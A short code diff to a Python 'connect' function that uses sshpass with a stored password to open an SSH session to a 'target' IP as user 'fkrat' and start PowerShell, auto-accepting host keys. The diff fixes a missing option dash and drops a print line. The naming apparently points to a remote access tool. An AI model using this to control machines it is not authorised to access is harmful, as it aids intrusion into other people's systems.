@@ -29,7 +29,5 @@ def connect(file):
 
     # remote connect
     os.system("clear")
-    os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} o StrictHostKeyChecking=accept-new 'powershell'")
-    print("if you are connecting the first time with the target please ")
+    os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} -o StrictHostKeyChecking=accept-new 'powershell'")
 
-#  Timeout for try
